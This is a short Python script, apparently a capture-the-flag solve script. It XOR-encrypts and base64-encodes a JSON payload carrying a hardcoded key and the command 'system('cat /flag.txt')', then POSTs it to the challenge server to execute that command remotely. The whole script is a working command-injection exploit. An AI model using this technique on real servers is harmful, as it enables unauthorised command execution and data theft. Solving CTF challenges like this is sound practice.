#!/usr/bin/env python3
import base64
import json
import requests

SECRET_KEY = '5p1n-th3-51lly-5tr1ng5'

def xor_encrypt(arg0, arg1):
    result = list(arg0)

    for i in range(min(len(arg0), len(arg1))):
        result[i] = chr(ord(arg0[i]) ^ ord(arg1[i]))

    return ''.join(result)

def double_xor_encrypt(arg0, arg1):
    return xor_encrypt(xor_encrypt(arg0, SECRET_KEY), arg1)

json_data = {
    'a': 'e',
    'ak': SECRET_KEY,
    'd': 'system(\'cat /flag.txt\');'
}

data = {
    SECRET_KEY: base64.b64encode(double_xor_encrypt(json.dumps(json_data), SECRET_KEY).encode())
}

response = requests.post('http://entangled-server.niccgetsspooky.xyz:1337', data=data)

print(response.text)
